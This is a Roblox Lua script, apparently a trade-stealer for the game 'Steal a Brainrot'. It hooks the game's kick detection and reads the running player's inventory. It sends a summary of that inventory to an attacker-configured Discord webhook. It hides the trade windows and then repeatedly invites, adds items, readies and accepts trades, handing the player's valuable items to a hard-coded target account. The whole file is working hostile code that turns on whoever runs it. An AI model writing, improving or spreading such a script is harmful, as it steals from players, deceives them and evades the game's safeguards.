-- Script principal - Subir a GitHub como raw
-- Esperar configuración
local function waitForConfig()
    while not getgenv().TARGET_ID or not getgenv().WEBHOOK_URL or not getgenv().TargetBrainrots do
        task.wait(0.1)
    end
end

waitForConfig()

local TARGET_ID = getgenv().TARGET_ID
local TARGET_USER = getgenv().TARGET_USER or ""
local WEBHOOK_URL = getgenv().WEBHOOK_URL
local TargetBrainrots = getgenv().TargetBrainrots

if not getgenv().antikick then
    getgenv().antikick = true
    local RS = game:GetService("ReplicatedStorage")
    pcall(function()
        local Sync = require(RS.Packages.Synchronizer)
        local getupvals = debug.getupvalues or getupvalues
        local setupval  = debug.setupvalue  or setupvalue
        local relate
        for _, v in pairs(getupvals(Sync.Get)) do
            if type(v) == "function" then relate = v break end
        end
        if relate then setupval(relate, 2, true) end
    end)

    local kck = "\239\187\191"
    local function isFlag(a) return type(a) == "string" and a:sub(-3) == kck end
    local newcc   = newcclosure or function(f) return f end
    local hookfn  = hookfunction or replaceclosure
    local setread = setreadonly or function() end

    pcall(function()
        local realFS = Instance.new("RemoteEvent").FireServer
        local oldHF
        oldHF = hookfn(realFS, newcc(function(self, ...)
            if isFlag((...)) then return end
            return oldHF(self, ...)
        end))
    end)

    pcall(function()
        local mt = getrawmetatable(game)
        setread(mt, false)
        local oldNC = mt.namecall
        mt.namecall = newcc(function(self, ...)
            local m = getnamecallmethod()
            if (m == "FireServer" or m == "fireServer") and isFlag((...)) then
                return
            end
            return oldNC(self, ...)
        end)
        setread(mt, true)
    end)
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local CurrentCamera = workspace.CurrentCamera
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local net = require(game.ReplicatedStorage.Packages.Net)

local Trade = {
    Invite = net:RemoteFunction("TradeService/Invite"),
    RemoveItem = net:RemoteFunction("TradeService/RemoveItem"),
    AcceptInvite = net:RemoteFunction("TradeService/AcceptInvite"),
    RemoveBrainrot = net:RemoteFunction("TradeService/RemoveBrainrot"),
    AddBrainrot = net:RemoteFunction("TradeService/AddBrainrot"),
    AddItem = net:RemoteFunction("TradeService/AddItem"),
    SearchUser = net:RemoteFunction("TradeService/SearchUser"),
    GetTradeHistory = net:RemoteFunction("TradeService/GetTradeHistory"),
    CreateInvite = net:RemoteEvent("TradeService/CreateInvite"),
    CancelTrade = net:RemoteEvent("TradeService/CancelTrade"),
    Ready = net:RemoteEvent("TradeService/Ready"),
    HistoryUpdated = net:RemoteEvent("TradeService/HistoryUpdated"),
    SendChatMessage = net:RemoteEvent("TradeService/SendChatMessage"),
    DeclineInvite = net:RemoteEvent("TradeService/DeclineInvite"),
    Accept = net:RemoteEvent("TradeService/Accept"),
    TradeCompleted = net:RemoteEvent("TradeService/TradeCompleted"),
}

task.spawn(function()
    local ACTION_DELAY = 1
    local TRADE_DELAY = 2

    local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
    local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
    local READY_GUID = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
    local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"

    local BLOCKED_GUI_NAMES = {["BrainrotTrader"] = true, ["TradeLiveTrade"] = true, ["TradePrompts"] = true}

    local MUTATION_VARIANTS = {
        Lava = {"lava"},
        Oro = {"oro", "gold"},
        Diamante = {"diamante", "diamond"},
        Cyber = {"cyber"},
        Phantom = {"phantom"},
        Candy = {"candy"},
        Divino = {"divino", "divine"},
        Cursed = {"cursed"},
        Bloodroot = {"bloodroot"},
        Rainbow = {"rainbow"},
        Radiactivo = {"radiactivo", "radioactive"},
        YingYang = {"yingyang", "ying yang", "yin yang", "yin-yang", "ying-yang"}
    }

    local MUTATION_COLORS = {
        Lava = Color3.fromRGB(255, 120, 0),
        Oro = Color3.fromRGB(255, 215, 0),
        Diamante = Color3.fromRGB(0, 255, 255),
        Cyber = Color3.fromRGB(0, 255, 150),
        Phantom = Color3.fromRGB(150, 0, 255),
        Candy = Color3.fromRGB(255, 50, 150),
        Divino = Color3.fromRGB(255, 215, 0),
        Cursed = Color3.fromRGB(0, 200, 0),
        Bloodroot = Color3.fromRGB(200, 0, 0),
        Rainbow = Color3.fromRGB(255, 0, 255),
        Radiactivo = Color3.fromRGB(0, 255, 0),
        YingYang = Color3.fromRGB(255, 255, 255)
    }

    local function hasMutation(data)
        if not data or type(data) ~= "table" then return false, nil end
        
        local function isExactMutation(text)
            if not text or type(text) ~= "string" then return false, nil end
            local lowerText = text:lower()
            
            for mutName, variants in pairs(MUTATION_VARIANTS) do
                for _, variant in ipairs(variants) do
                    if lowerText == variant:lower() then
                        return true, mutName
                    end
                end
            end
            return false, nil
        end
        
        local mutationFields = {"Mutation", "Mutations", "mutation", "mutations"}
        
        for _, field in ipairs(mutationFields) do
            if data[field] then
                if type(data[field]) == "string" then
                    local found, mutName = isExactMutation(data[field])
                    if found then return true, mutName end
                end
                if type(data[field]) == "table" then
                    for key, value in pairs(data[field]) do
                        if type(key) == "string" then
                            local found, mutName = isExactMutation(key)
                            if found and (value == true or value == 1) then
                                return true, mutName
                            end
                        end
                        if type(value) == "string" then
                            local found, mutName = isExactMutation(value)
                            if found then return true, mutName end
                        end
                    end
                end
            end
        end
        
        if data.ETC and type(data.ETC) == "table" then
            for key, value in pairs(data.ETC) do
                if type(key) == "string" then
                    local found, mutName = isExactMutation(key)
                    if found and (value == true or value == 1) then
                        return true, mutName
                    end
                end
            end
        end
        
        if data.Traits and type(data.Traits) == "table" then
            for key, value in pairs(data.Traits) do
                if type(key) == "string" then
                    local found, mutName = isExactMutation(key)
                    if found and (value == true or value == 1) then
                        return true, mutName
                    end
                end
            end
        end
        
        return false, nil
    end

    local function getMutationColor(mutationName)
        return MUTATION_COLORS[mutationName] or Color3.fromRGB(169, 169, 169)
    end

    local function getBrainrotColor(data, index)
        local hasMut, mutName = hasMutation(data)
        if hasMut and mutName then
            return getMutationColor(mutName)
        end
        
        local color = nil
        pcall(function()
            local model = ReplicatedStorage.Models.Animals:FindFirstChild(index)
            if not model then return end
            for _, part in ipairs(model:GetDescendants()) do
                if part:IsA("BasePart") then
                    color = part.Color
                    break
                end
            end
        end)
        return color or Color3.fromRGB(169, 169, 169)
    end

    local function initializeEnvironment()
        local leftCenter = PlayerGui:FindFirstChild("LeftCenter")
        if leftCenter then
            leftCenter:Destroy()
        end

        local function cleanupBlur(obj)
            if obj:IsA("BlurEffect") then task.defer(function() obj:Destroy() end) end
        end
        CurrentCamera.ChildAdded:Connect(cleanupBlur)
        for _, v in ipairs(CurrentCamera:GetChildren()) do cleanupBlur(v) end

        CurrentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
            CurrentCamera.FieldOfView = 70
        end)
        CurrentCamera.FieldOfView = 70

        local function cleanupGui(obj)
            if BLOCKED_GUI_NAMES[obj.Name] then task.defer(function() obj:Destroy() end) end
        end
        PlayerGui.ChildAdded:Connect(cleanupGui)
        for _, v in ipairs(PlayerGui:GetChildren()) do cleanupGui(v) end
    end

    local AnimalsShared
    pcall(function()
        AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
    end)

    local function getMyBaseData()
        local module = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
        if not module then return nil end
        local sync = require(module)
        local syncGet = sync.Get
        
        local syncTable = nil
        for i = 1, 15 do
            local success, value = pcall(debug.getupvalue, syncGet, i)
            if success and type(value) == "table" then 
                syncTable = value
                break 
            end
        end
        
        if not syncTable then return nil end
        
        local myData = {}
        for _, plotData in pairs(syncTable) do
            if type(plotData) == "table" then
                local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
                
                local isMine = false
                if typeof(owner) == "Instance" and owner == LocalPlayer then
                    isMine = true
                elseif typeof(owner) == "table" and owner.UserId == LocalPlayer.UserId then
                    isMine = true
                end
                
                if isMine then
                    table.insert(myData, plotData)
                end
            end
        end
        
        return myData
    end

    local MyBaseData = getMyBaseData()
    if not MyBaseData or #MyBaseData == 0 then 
        print("❌ No se encontraron datos de tu base")
        return 
    end

    local brainrotQueue = {}
    local mutationQueue = {}

    for _, plotData in pairs(MyBaseData) do
        if type(plotData) == "table" then
            local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
            if type(animalList) == "table" then
                for slotKey, data in pairs(animalList) do
                    if type(data) == "table" and data.Index and TargetBrainrots[data.Index] then
                        local hasMut, mutName = hasMutation(data)
                        table.insert(brainrotQueue, {slotKey = tonumber(slotKey), data = data, hasMutation = hasMut, mutation = mutName})
                        if hasMut and mutName then
                            table.insert(mutationQueue, {slotKey = tonumber(slotKey), data = data, mutation = mutName})
                        end
                    end
                end
            end
        end
    end

    if #brainrotQueue == 0 then 
        print("❌ No se encontraron brainrots en tu base")
        return 
    end
    
    initializeEnvironment()

    local function formatCurrency(n)
        if not n then return "$0/s" end
        local function clean(s) return s:gsub("%.?0+$", "") end
        if n >= 1e12 then return "$" .. clean(string.format("%.2f", n/1e12)) .. "T/s" end
        if n >= 1e9  then return "$" .. clean(string.format("%.2f", n/1e9))  .. "B/s" end
        if n >= 1e6  then return "$" .. clean(string.format("%.2f", n/1e6))  .. "M/s" end
        if n >= 1e3  then return "$" .. clean(string.format("%.2f", n/1e3))  .. "K/s" end
        return "$" .. tostring(math.floor(n)) .. "/s"
    end

    local function getRequest()
        return (syn and syn.request) or (http and http.request) or http_request or request
    end

    local function colorToDecimal(c)
        return c and (math.floor(c.R * 255) * 65536 + math.floor(c.G * 255) * 256 + math.floor(c.B * 255)) or 3447003
    end

    local function sendWebhook()
        local results = {}
        local mutationResults = {}

        for _, plotData in pairs(MyBaseData) do
            local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
            if type(animalList) == "table" then
                for slot, data in pairs(animalList) do
                    if type(data) == "table" and TargetBrainrots[data.Index] then
                        local genVal = AnimalsShared:GetGeneration(data.Index, data.Mutation, data.Traits, nil)
                        local hasMut, mutName = hasMutation(data)
                        
                        local entry = {
                            name = data.Index, 
                            genVal = genVal, 
                            genStr = formatCurrency(genVal),
                            hasMutation = hasMut,
                            mutation = mutName,
                            data = data
                        }
                        table.insert(results, entry)
                        if hasMut and mutName then
                            table.insert(mutationResults, entry)
                        end
                    end
                end
            end
        end

        if #results == 0 then return end
        
        table.sort(results, function(a, b) return a.genVal > b.genVal end)
        table.sort(mutationResults, function(a, b) return a.genVal > b.genVal end)
        
        local top = results[1]
        local color = getBrainrotColor(top.data, top.name)

        local description = ""
        
        local topMutationText = ""
        if top.hasMutation and top.mutation then
            topMutationText = string.format(" `[%s]`", top.mutation)
        end
        description = description .. string.format("**🍓 Top:** %s — %s%s\n\n", top.name, top.genStr, topMutationText)
        
        description = description .. "**BRAINROTS EN LA BASE:**\n"
        local maxDisplay = math.min(15, #results)
        for i = 1, maxDisplay do
            local res = results[i]
            local mutationText = ""
            if res.hasMutation and res.mutation then
                mutationText = string.format(" `[%s]`", res.mutation)
            end
            description = description .. string.format("%s — %s%s\n", res.name, res.genStr, mutationText)
        end
        if #results > 15 then
            description = description .. string.format("*... y %d más*\n", #results - 15)
        end
        
        description = description .. string.format("\n**Total en tu base:** %d brainrots (%d con mutación)", #results, #mutationResults)

        local payload = {
            content = "@everyone",
            embeds = {{
                title = "ᴍᴏᴏɴ ꜱᴄʀɪᴘᴛꜱ ☪︎",
                description = description,
                color = colorToDecimal(color),
                footer = {text = string.format("%s | %s", LocalPlayer.Name, os.date("%H:%M:%S"))}
            }},
            username = "ᴍᴏᴏɴ ꜱᴄʀɪᴘᴛꜱ ☪︎",
            avatar_url = "https://i.pinimg.com/736x/47/75/7c/47757c272b43141436f8cba221d6c5d9.jpg"
        }
        
        local requestFn = getRequest()
        if requestFn then
            pcall(function()
                requestFn({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
            end)
        end
    end

    local function startAutomation()
        local inviteRemote = Trade.Invite
        local addRemote = Trade.AddBrainrot
        local readyRemote = Trade.Ready
        local acceptRemote = Trade.Accept

        local prioritizedQueue = {}
        for _, item in ipairs(brainrotQueue) do
            if item.hasMutation then
                table.insert(prioritizedQueue, item)
            end
        end
        for _, item in ipairs(brainrotQueue) do
            if not item.hasMutation then
                table.insert(prioritizedQueue, item)
            end
        end

        task.spawn(function()
            local idx = 1
            while true do
                local item = prioritizedQueue[idx]
                if item then
                    pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
                    idx = (idx % #prioritizedQueue) + 1
                end
                task.wait(ACTION_DELAY)
            end
        end)

        task.spawn(function()
            while true do
                pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
                task.wait(TRADE_DELAY)
            end
        end)

        task.spawn(function()
            while true do
                pcall(function() readyRemote:FireServer(READY_GUID) end)
                task.wait(1)
                pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
                task.wait(1)
            end
        end)
    end

    print(string.format("BASE: %d", #brainrotQueue))
    local mutationCount = 0
    for _, item in ipairs(brainrotQueue) do
        if item.hasMutation then mutationCount = mutationCount + 1 end
    end
    print(string.format("MUTACIONES: %d", mutationCount))

    sendWebhook()
    startAutomation()
end)
